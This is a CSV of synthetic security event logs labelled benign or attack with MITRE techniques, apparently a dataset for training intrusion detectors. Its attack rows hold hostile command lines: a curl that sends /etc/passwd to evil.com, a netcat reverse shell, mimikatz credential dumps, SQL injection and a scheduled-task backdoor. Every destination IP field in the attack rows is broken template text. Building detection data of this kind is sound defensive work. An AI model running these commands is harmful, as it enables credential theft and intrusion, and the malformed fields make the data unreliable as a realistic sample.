@timestamp,label,attack_name,mitre_technique,mitre_tactic,event.category,event.outcome,source.ip,source.port,destination.ip,destination.port,network.bytes,network.packets,agent.hostname,agent.type,user.name,process.pid,process.name,process.command_line,file_name,domain
2026-09-13T15:08:17.563986,benign,,,,process,success,192.168.1.39,1024,10.0.1.157,80,5206,24,db5,linux,emily.davis,8998,nginx,apache2 -DFOREGROUND,,
2026-09-12T14:48:47.543425,attack,webshell,T1505,persistence,file,success,192.168.56.1,0,"10.0.0.{random.randint(1, 254)}",0,2013,6,backup100,linux,admin,6955,php,php /var/www/html/shell.php,shell.php,
2026-09-10T10:59:55.546591,attack,sql_injection,T1190,initial_access,web,success,192.168.56.5,55564,"10.0.0.{random.randint(1, 254)}",80,760,33,srv50,linux,administrator,5770,bash,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-15T12:49:17.546957,attack,credential_dump,T1003,credential_access,process,success,192.168.56.1,0,"10.0.0.{random.randint(1, 254)}",0,3494,7,web3,windows,root,1039,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-12T05:41:29.546120,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.9,13678,"10.0.0.{random.randint(1, 254)}",443,6987,63,mail2,linux,test,281,cmd.exe,,,evil-c2.com
2026-09-13T01:37:40.540553,attack,credential_dump,T1003,credential_access,process,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,7152,5,app20,linux,administrator,574,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-12T11:05:04.562779,benign,,,,network,success,192.168.1.35,1024,10.0.1.42,22,5228,98,mail5,linux,emily.davis,4960,systemd,firefox.exe,,
2026-09-13T17:27:15.546104,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.2,15146,"10.0.0.{random.randint(1, 254)}",445,13457,67,srv1,linux,admin,6737,psexec.exe,,,
2026-09-12T23:27:58.553131,benign,,,,network,success,192.168.1.157,2048,10.0.3.35,53,2212,29,srv4,linux,sarah.jones,8169,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-10T22:27:17.556631,benign,,,,process,success,192.168.1.121,3072,10.0.2.91,443,2426,54,mail20,windows,emily.davis,8636,apache2,explorer.exe,,
2026-09-09T02:14:48.543256,attack,webshell,T1505,persistence,file,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,1644,8,app10,windows,root,4879,php,php /var/www/html/shell.php,shell.php,
2026-09-14T07:51:03.559714,benign,,,,authentication,success,192.168.1.87,4096,10.0.1.55,80,2643,22,app5,linux,mark.wilson,2233,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-09T15:06:35.564187,benign,,,,network,success,192.168.1.245,1024,10.0.5.69,22,1169,53,srv10,linux,admin,246,explorer.exe,firefox.exe,,
2026-09-11T23:46:53.542752,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.9,2642,"10.0.0.{random.randint(1, 254)}",22,1815,17,srv4,windows,test,2044,python3,,,
2026-09-14T09:21:26.562433,benign,,,,authentication,success,192.168.1.239,3072,10.0.0.42,53,6655,26,web100,linux,sarah.jones,3716,apache2,explorer.exe,,
2026-09-15T09:05:58.541335,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.7,9611,"10.0.0.{random.randint(1, 254)}",445,18698,141,srv2,windows,admin,6300,psexec.exe,,,
2026-09-10T14:09:29.546476,attack,credential_dump,T1003,credential_access,process,success,192.168.56.5,0,"10.0.0.{random.randint(1, 254)}",0,2915,3,db100,windows,admin,9361,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-08T23:55:23.544563,attack,port_scan,T1046,discovery,network,success,192.168.56.1,54108,"10.0.0.{random.randint(1, 254)}",443,1409,8,srv100,windows,admin,6640,powershell.exe,,,
2026-09-15T01:52:32.551630,benign,,,,network,success,192.168.1.104,2048,10.0.3.93,443,2736,74,srv5,windows,lisa.wilson,5249,explorer.exe,explorer.exe,,
2026-09-14T12:40:26.560090,benign,,,,network,success,192.168.1.218,3072,10.0.3.39,443,8914,100,srv10,linux,mark.wilson,1934,firefox.exe,firefox.exe,,
2026-09-10T15:00:27.558583,benign,,,,authentication,success,192.168.1.173,2048,10.0.4.73,80,1713,50,app5,linux,jane.smith,2964,sshd,firefox.exe,,
2026-09-11T04:14:44.548220,attack,sql_injection,T1190,initial_access,web,success,192.168.56.6,55614,"10.0.0.{random.randint(1, 254)}",80,2732,47,app50,windows,administrator,6439,cmd.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-15T14:53:11.566484,benign,,,,network,success,192.168.1.132,3072,10.0.3.135,443,6885,69,srv10,linux,jane.smith,3372,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-15T14:52:13.559153,benign,,,,network,success,192.168.1.172,2048,10.0.5.64,443,1450,33,db4,windows,chris.miller,4916,systemd,chrome.exe --profile-directory=Default,,
2026-09-09T04:31:03.558073,benign,,,,authentication,success,192.168.1.101,1024,10.0.1.12,80,3144,75,web3,windows,chris.miller,1754,sshd,explorer.exe,,
2026-09-10T16:47:29.543844,attack,sql_injection,T1190,initial_access,web,success,192.168.56.1,44023,"10.0.0.{random.randint(1, 254)}",80,1833,31,mail5,linux,administrator,7322,python3,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-09T07:14:13.546130,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.1,28243,"10.0.0.{random.randint(1, 254)}",443,6858,66,srv50,linux,root,4396,python3,,,evil-c2.com
2026-09-15T02:49:39.563400,benign,,,,network,success,192.168.1.251,4096,10.0.0.160,53,6465,58,workstation20,linux,jane.smith,6117,sshd,explorer.exe,,
2026-09-12T16:11:54.565831,benign,,,,authentication,success,192.168.1.202,4096,10.0.3.4,3306,4617,29,app50,linux,jane.smith,8259,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-08T20:06:06.567720,benign,,,,process,success,192.168.1.165,4096,10.0.3.179,80,9604,21,workstation2,windows,mike.brown,6445,firefox.exe,apache2 -DFOREGROUND,,
2026-09-10T20:05:55.540930,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.1,8217,"10.0.0.{random.randint(1, 254)}",443,1829,56,db10,linux,test,2297,python3,,,evil-c2.com
2026-09-14T04:02:58.552278,benign,,,,authentication,success,192.168.1.129,8443,10.0.1.34,22,2500,93,srv4,linux,lisa.wilson,3039,chrome.exe,apache2 -DFOREGROUND,,
2026-09-10T06:27:36.566833,benign,,,,network,success,192.168.1.176,3072,10.0.2.35,53,9105,1,mail10,windows,emily.davis,8768,explorer.exe,explorer.exe,,
2026-09-14T13:06:30.570757,benign,,,,network,success,192.168.1.153,2048,10.0.3.112,53,2584,59,app1,windows,lisa.wilson,4235,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-10T11:39:50.567294,benign,,,,network,success,192.168.1.27,3072,10.0.2.67,3306,9502,6,srv20,windows,david.moore,9899,systemd,firefox.exe,,
2026-09-12T01:23:35.569500,benign,,,,authentication,success,192.168.1.222,8443,10.0.3.127,3306,6185,94,srv100,linux,emily.davis,4320,chrome.exe,apache2 -DFOREGROUND,,
2026-09-10T04:22:33.541007,attack,persistence,T1053,persistence,process,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,847,7,mail10,linux,guest,7961,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-08T18:59:17.555166,benign,,,,network,success,192.168.1.42,8443,10.0.0.111,22,8256,37,srv4,windows,chris.miller,6867,sshd,explorer.exe,,
2026-09-15T02:27:51.551687,benign,,,,network,success,192.168.1.183,2048,10.0.2.111,53,4953,70,workstation3,linux,david.moore,2576,systemd,chrome.exe --profile-directory=Default,,
2026-09-10T22:20:05.555184,benign,,,,authentication,success,192.168.1.105,2048,10.0.4.230,80,8226,60,web10,linux,lisa.wilson,7511,apache2,explorer.exe,,
2026-09-09T08:08:53.541278,attack,persistence,T1053,persistence,process,success,192.168.56.10,0,"10.0.0.{random.randint(1, 254)}",0,565,5,workstation20,linux,admin,4080,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-15T10:28:08.547982,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.4,31335,"10.0.0.{random.randint(1, 254)}",443,31556,262,srv20,linux,administrator,8069,python3,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-12T19:59:23.553990,benign,,,,process,success,192.168.1.12,1024,10.0.3.85,53,3682,100,mail50,windows,mike.brown,6676,explorer.exe,apache2 -DFOREGROUND,,
2026-09-09T15:33:27.543130,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.8,61517,"10.0.0.{random.randint(1, 254)}",443,6028,9,srv5,linux,administrator,3400,python3,,,evil-c2.com
2026-09-12T15:31:12.569765,benign,,,,network,success,192.168.1.39,5000,10.0.3.140,443,7473,2,workstation5,linux,mark.wilson,8419,nginx,chrome.exe --profile-directory=Default,,
2026-09-12T11:25:33.565593,benign,,,,authentication,success,192.168.1.154,5000,10.0.1.207,443,2604,79,workstation3,linux,john.doe,1021,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-10T03:03:18.559409,benign,,,,authentication,success,192.168.1.46,5000,10.0.1.26,22,6842,55,db4,linux,admin,8200,firefox.exe,apache2 -DFOREGROUND,,
2026-09-13T05:50:36.556516,benign,,,,network,success,192.168.1.29,2048,10.0.4.137,22,2568,64,mail50,windows,john.doe,534,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-08T22:08:18.570056,benign,,,,network,success,192.168.1.212,1024,10.0.4.103,80,2225,39,backup20,windows,john.doe,4455,firefox.exe,firefox.exe,,
2026-09-14T23:05:33.570591,benign,,,,network,success,192.168.1.140,2048,10.0.1.142,443,7032,7,srv50,linux,john.doe,5774,sshd,firefox.exe,,
2026-09-13T23:31:04.552697,benign,,,,authentication,success,192.168.1.83,5000,10.0.2.159,53,2783,39,backup2,windows,chris.miller,1349,firefox.exe,apache2 -DFOREGROUND,,
2026-09-13T12:42:37.541634,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.3,26599,"10.0.0.{random.randint(1, 254)}",22,1089,14,srv10,linux,test,7799,powershell.exe,,,
2026-09-11T17:50:38.561830,benign,,,,file,success,192.168.1.95,8443,10.0.5.32,3306,7948,92,app3,windows,lisa.wilson,6547,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-12T13:21:54.562041,benign,,,,file,success,192.168.1.119,3072,10.0.1.77,22,2957,36,app10,windows,david.moore,9741,apache2,firefox.exe,,
2026-09-11T06:31:18.565331,benign,,,,authentication,success,192.168.1.222,2048,10.0.3.128,443,1350,86,app20,windows,jane.smith,138,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-12T19:25:24.548667,benign,,,,network,success,192.168.1.100,8443,10.0.1.190,3306,7470,9,workstation10,linux,jane.smith,6339,explorer.exe,firefox.exe,,
2026-09-14T01:52:15.540941,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.7,17215,"10.0.0.{random.randint(1, 254)}",53,41607,96,backup100,windows,guest,5426,cmd.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-14T04:03:59.566839,benign,,,,network,success,192.168.1.56,1024,10.0.0.83,443,3463,94,db2,windows,admin,9927,sshd,explorer.exe,,
2026-09-09T17:41:10.560610,benign,,,,process,success,192.168.1.60,3072,10.0.1.234,22,1399,11,app5,linux,mark.wilson,3731,firefox.exe,explorer.exe,,
2026-09-09T10:11:12.551017,benign,,,,authentication,success,192.168.1.105,2048,10.0.3.168,443,7377,24,web1,windows,emily.davis,4608,sshd,firefox.exe,,
2026-09-11T11:10:12.563042,benign,,,,network,success,192.168.1.71,1024,10.0.3.96,22,2014,36,srv1,linux,sarah.jones,2667,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-12T10:48:28.543430,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.4,30591,"10.0.0.{random.randint(1, 254)}",445,48121,52,mail2,windows,admin,8393,psexec.exe,,,
2026-09-10T13:40:47.547871,attack,persistence,T1053,persistence,process,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,754,9,backup10,linux,test,7686,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-09T09:58:01.559721,benign,,,,network,success,192.168.1.112,5000,10.0.2.120,443,4548,26,srv4,linux,mark.wilson,3200,apache2,explorer.exe,,
2026-09-13T08:23:22.564999,benign,,,,network,success,192.168.1.51,8443,10.0.4.19,80,2116,47,web2,linux,david.moore,9768,sshd,chrome.exe --profile-directory=Default,,
2026-09-15T15:42:17.546166,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.4,49285,"10.0.0.{random.randint(1, 254)}",445,20235,384,mail5,linux,root,2664,psexec.exe,,,
2026-09-11T03:50:24.545092,attack,persistence,T1053,persistence,process,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,939,1,web2,linux,guest,1646,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-14T13:13:38.564069,benign,,,,authentication,success,192.168.1.56,1024,10.0.0.120,3306,1559,51,srv5,linux,emily.davis,2461,apache2,explorer.exe,,
2026-09-11T05:02:00.557689,benign,,,,network,success,192.168.1.165,4096,10.0.3.240,22,4304,7,srv10,linux,mark.wilson,4858,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-13T19:03:24.570032,benign,,,,process,success,192.168.1.38,8443,10.0.5.67,22,1870,21,backup10,linux,john.doe,266,sshd,apache2 -DFOREGROUND,,
2026-09-12T08:11:15.544624,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.9,26961,"10.0.0.{random.randint(1, 254)}",22,901,10,workstation100,linux,guest,7468,python3,,,
2026-09-11T01:32:05.544242,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.7,52170,"10.0.0.{random.randint(1, 254)}",22,1923,14,srv3,windows,root,5618,cmd.exe,,,
2026-09-13T14:35:31.556764,benign,,,,network,success,192.168.1.254,2048,10.0.0.19,22,3779,15,backup100,linux,admin,6632,explorer.exe,explorer.exe,,
2026-09-09T20:00:14.556422,benign,,,,network,success,192.168.1.79,4096,10.0.5.226,3306,7540,47,srv20,windows,admin,1968,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-11T17:15:33.570689,benign,,,,authentication,success,192.168.1.99,5000,10.0.5.205,80,9657,82,db20,linux,admin,7167,firefox.exe,firefox.exe,,
2026-09-10T13:47:46.543618,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.4,34274,"10.0.0.{random.randint(1, 254)}",445,30089,64,backup5,windows,administrator,4500,psexec.exe,,,
2026-09-10T16:16:51.563933,benign,,,,network,success,192.168.1.66,2048,10.0.5.82,3306,674,2,backup1,windows,john.doe,5468,sshd,firefox.exe,,
2026-09-09T14:32:17.547169,attack,credential_dump,T1003,credential_access,process,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,4949,7,backup50,linux,root,6490,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-14T14:02:07.570497,benign,,,,process,success,192.168.1.117,8443,10.0.2.21,80,3616,88,db5,windows,chris.miller,9686,chrome.exe,apache2 -DFOREGROUND,,
2026-09-14T07:43:09.570470,benign,,,,process,success,192.168.1.94,5000,10.0.0.203,80,5429,29,mail50,windows,jane.smith,1426,apache2,firefox.exe,,
2026-09-12T01:30:49.542033,attack,sql_injection,T1190,initial_access,web,success,192.168.56.4,61790,"10.0.0.{random.randint(1, 254)}",80,4706,26,mail4,windows,root,9865,python3,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-13T16:10:49.544943,attack,credential_dump,T1003,credential_access,process,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,3263,4,workstation10,windows,administrator,3083,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-11T20:00:05.560186,benign,,,,authentication,success,192.168.1.45,3072,10.0.2.225,80,7875,91,backup100,windows,jane.smith,9469,sshd,apache2 -DFOREGROUND,,
2026-09-10T19:01:01.541759,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.10,31561,"10.0.0.{random.randint(1, 254)}",22,1369,10,app5,linux,admin,8976,python3,,,
2026-09-10T00:02:43.556485,benign,,,,network,success,192.168.1.109,4096,10.0.4.65,443,4924,74,app20,linux,jane.smith,4389,systemd,explorer.exe,,
2026-09-12T22:03:28.543333,attack,reverse_shell,T1059,execution,process,success,192.168.56.4,38524,"10.0.0.{random.randint(1, 254)}",4444,1759,5,web50,windows,root,6089,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-13T13:31:57.562715,benign,,,,file,success,192.168.1.107,5000,10.0.5.251,3306,8223,2,backup20,linux,mark.wilson,7656,systemd,explorer.exe,,
2026-09-14T13:28:58.565587,benign,,,,authentication,success,192.168.1.22,4096,10.0.0.6,3306,4127,86,srv20,windows,admin,7828,nginx,chrome.exe --profile-directory=Default,,
2026-09-10T03:08:14.570780,benign,,,,network,success,192.168.1.233,4096,10.0.3.27,443,2293,44,srv1,linux,jane.smith,2213,explorer.exe,apache2 -DFOREGROUND,,
2026-09-15T07:24:01.558142,benign,,,,authentication,success,192.168.1.119,4096,10.0.2.101,443,8814,92,backup100,windows,jane.smith,3017,apache2,apache2 -DFOREGROUND,,
2026-09-11T01:18:11.543634,attack,credential_dump,T1003,credential_access,process,success,192.168.56.5,0,"10.0.0.{random.randint(1, 254)}",0,8101,8,app100,linux,admin,2533,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-15T14:10:42.545306,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.3,5463,"10.0.0.{random.randint(1, 254)}",22,1065,19,app100,linux,administrator,4015,cmd.exe,,,
2026-09-13T13:31:05.543220,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.3,41991,"10.0.0.{random.randint(1, 254)}",443,22381,341,workstation50,windows,test,7407,cmd.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-14T23:50:17.568968,benign,,,,network,success,192.168.1.204,3072,10.0.5.181,80,7553,95,srv20,windows,john.doe,4716,firefox.exe,explorer.exe,,
2026-09-11T11:23:36.554473,benign,,,,network,success,192.168.1.76,4096,10.0.1.88,22,2770,57,mail20,windows,david.moore,6365,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-10T11:19:18.561282,benign,,,,process,success,192.168.1.54,1024,10.0.3.244,443,4245,34,mail20,windows,chris.miller,3032,nginx,chrome.exe --profile-directory=Default,,
2026-09-10T12:00:17.571429,benign,,,,process,success,192.168.1.158,5000,10.0.2.173,3306,8551,13,web4,windows,john.doe,6878,sshd,firefox.exe,,
2026-09-09T05:12:40.570380,benign,,,,network,success,192.168.1.25,2048,10.0.5.14,3306,6806,66,workstation5,linux,mark.wilson,4935,sshd,explorer.exe,,
2026-09-15T14:52:28.564797,benign,,,,network,success,192.168.1.43,5000,10.0.4.152,80,4952,48,backup5,linux,chris.miller,6086,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-10T18:41:20.541896,attack,credential_dump,T1003,credential_access,process,success,192.168.56.1,0,"10.0.0.{random.randint(1, 254)}",0,1688,10,mail10,linux,test,7764,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-10T13:14:42.552709,benign,,,,network,success,192.168.1.210,4096,10.0.2.224,22,4573,100,web50,windows,mark.wilson,4170,nginx,apache2 -DFOREGROUND,,
2026-09-10T00:29:48.555658,benign,,,,file,success,192.168.1.113,8443,10.0.2.129,3306,8966,54,mail20,windows,john.doe,6899,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-13T08:12:36.566501,benign,,,,authentication,success,192.168.1.217,1024,10.0.0.45,22,5528,13,backup3,windows,emily.davis,2866,sshd,chrome.exe --profile-directory=Default,,
2026-09-14T08:10:16.560130,benign,,,,authentication,success,192.168.1.87,8443,10.0.1.217,80,3538,62,backup10,linux,john.doe,4527,systemd,explorer.exe,,
2026-09-15T00:33:56.563277,benign,,,,file,success,192.168.1.41,8443,10.0.3.154,53,1691,91,db10,linux,david.moore,9386,explorer.exe,explorer.exe,,
2026-09-09T22:58:17.547274,attack,reverse_shell,T1059,execution,process,success,192.168.56.9,47764,"10.0.0.{random.randint(1, 254)}",4444,3205,24,db2,windows,test,7124,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-12T11:50:28.548992,benign,,,,authentication,success,192.168.1.239,2048,10.0.0.77,3306,6668,30,web20,windows,john.doe,6704,apache2,chrome.exe --profile-directory=Default,,
2026-09-14T22:46:22.560223,benign,,,,network,success,192.168.1.66,8443,10.0.2.4,3306,5290,28,mail50,linux,chris.miller,3705,explorer.exe,explorer.exe,,
2026-09-14T18:26:51.565545,benign,,,,process,success,192.168.1.135,4096,10.0.5.137,3306,389,4,mail100,windows,chris.miller,356,apache2,apache2 -DFOREGROUND,,
2026-09-10T21:04:21.544497,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.1,8490,"10.0.0.{random.randint(1, 254)}",53,47143,204,mail5,windows,test,1998,cmd.exe,curl -d @/etc/passwd http://evil.com/exfil,,
